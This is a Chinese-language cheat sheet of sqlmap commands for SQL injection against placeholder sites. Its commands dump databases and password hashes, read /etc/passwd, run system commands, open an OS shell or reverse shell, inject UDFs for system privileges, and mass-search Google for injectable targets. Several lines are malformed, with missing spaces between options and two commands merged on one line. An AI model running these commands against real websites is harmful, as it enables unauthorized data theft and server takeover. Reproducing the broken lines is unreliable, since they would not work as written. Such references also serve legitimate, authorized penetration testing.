sqlmap工具
==========

sqlmap实例：
* `sqlmap -h` 帮助
* `sqlmap -u "http://url/news?id=1" --current-user` #获取当前用户名称 
* `sqlmap -u "http://www.xxoo.com/news?id=1" --current-db` #获取当前数据库名称
* `sqlmap -u "http://www.xxoo.com/news?id=1" --tables -D "db_name"` #列表名 
* `sqlmap -u "http://url/news?id=1" --columns -T "tablename" users-D "db_name" -v 0` #列字段
* `sqlmap -u "http://url/news?id=1" --dump -C "column_name" -T "table_name" -D "db_name" -v 0` #获取字段内容
* `sqlmap -u "http://url/news?id=1" --smart --level 3 --users` # smart智能 level 执行测试等级
* `sqlmap -u "http://url/news?id=1" --dbms "Mysql" --users` # dbms 指定数据库类型
* `sqlmap -u "http://url/news?id=1" --users` #列数据库用户
* `sqlmap -u "http://url/news?id=1" --dbs` #列数据库 
* `sqlmap -u "http://url/news?id=1" --passwords` #数据库用户密码 
* `sqlmap -u "http://url/news?id=1" --passwords-U root -v 0` #列出指定用户数据库密码
* `sqlmap -u "http://url/news?id=1"  --dump -C "password,user,id" -T "tablename" -D "db_name" --start 1 --stop 20` #列出指定字段，列出20条 
* `sqlmap -u "http://url/news?id=1" --dump-all -v 0` #列出所有数据库所有表
* `sqlmap -u "http://url/news?id=1" --privileges` #查看权限 
* `sqlmap -u "http://url/news?id=1" --privileges -U root` #查看指定用户权限
* `sqlmap -u "http://url/news?id=1" --is-dba -v 1` #是否是数据库管理员
* `sqlmap -u "http://url/news?id=1" --roles` #枚举数据库用户角色 
* `sqlmap -u "http://url/news?id=1" --udf-inject` #导入用户自定义函数（获取系统权限！）
* `sqlmap -u "http://url/news?id=1" --dump-all --exclude-sysdbs -v 0` #列出当前库所有表
* `sqlmap -u "http://url/news?id=1" --union-cols` #union 查询表记录 
* `sqlmap -u "http://url/news?id=1" --cookie "COOKIE_VALUE"` #cookie注入
* `sqlmap -u "http://url/news?id=1" -b` #获取banner信息
* `sqlmap -u "http://url/news?id=1" --data "id=3"` #post注入
* `sqlmap -u "http://url/news?id=1" -v 1 -f` #指纹判别数据库类型 
* `sqlmap -u "http://url/news?id=1" --proxy"http://127.0.0.1:8118"` #代理注入
* `sqlmap -u "http://url/news?id=1" --string"STRING_ON_TRUE_PAGE"` #指定关键词
* `sqlmap -u "http://url/news?id=1" --sql-shell` #执行指定sql命令
* `sqlmap -u "http://url/news?id=1" --file /etc/passwd` 
* `sqlmap -u "http://url/news?id=1" --os-cmd=whoami` #执行系统命令
* `sqlmap -u "http://url/news?id=1" --os-shell` #系统交互shell
* `sqlmap -u "http://url/news?id=1" --os-pwn` #反弹shell 
* `sqlmap -u "http://url/news?id=1" --reg-read` #读取win系统注册表
* `sqlmap -u "http://url/news?id=1" --dbs-o "sqlmap.log"` #保存进度 
* `sqlmap -u "http://url/news?id=1" --dbs -o "sqlmap.log" --resume` #恢复已保存进度sqlmap -g "google语法" --dump-all --batch #google搜索注入点自动 跑出所有字段攻击实例
* `sqlmap -u "http://url/news?id=1&Submit=Submit" --cookie="PHPSESSID=41aa833e6d0d28f489ff1ab5a7531406" --string="Surname" --dbms=mysql --users —password`